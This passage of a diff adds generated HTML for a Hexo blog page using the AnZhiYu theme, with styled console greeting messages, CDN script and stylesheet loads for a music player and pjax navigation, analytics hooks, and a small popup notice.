+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Attackxu 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
